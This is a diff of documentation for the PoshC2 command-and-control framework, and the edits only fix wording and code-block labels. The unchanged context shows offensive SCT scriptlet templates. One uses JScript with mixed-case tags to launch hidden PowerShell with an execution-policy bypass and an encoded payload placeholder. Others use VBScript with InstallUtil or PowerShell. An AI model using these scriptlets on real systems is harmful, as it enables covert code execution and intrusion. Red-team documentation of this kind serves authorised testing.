@@ -3,12 +3,12 @@ SCT Files
 ############
 Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_
 
-SCT Files can be used in many execution methods, most of which have been discovered by SubTee. PoshC2 utilised a few of 
-these methods and hosts these seperately so you can use this for execution. 
+SCT Files can be used by many execution methods, most of which have been discovered by SubTee. PoshC2 utilised a few of 
+these methods and hosts the files separately, to be used for execution. 
 
 JScript Powershell Execution
 ##############################
-.. code-block:: powershell
+.. code-block:: Powershell
 	
 	<sCrIptlEt><scRIPt>
 	a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec bypass -Noninteractive -windowstyle hidden -e <base64 encoded payload>","","open","0");
@@ -16,7 +16,7 @@ JScript Powershell Execution
 
 VBScript Execute EXE with InstallUtil
 #######################################
-.. code-block:: powershell
+.. code-block:: Powershell
 	
 	<sCrIptlEt>
 	<ScRIpt language="VBSCRIPT">
@@ -52,7 +52,7 @@ VBScript Execute EXE with InstallUtil
 
 VBScript Powershell Execution
 ################################
-.. code-block:: powershell
+.. code-block:: Powershell
 
 	<?XML version="1.0"?>
 	<scriptlet>
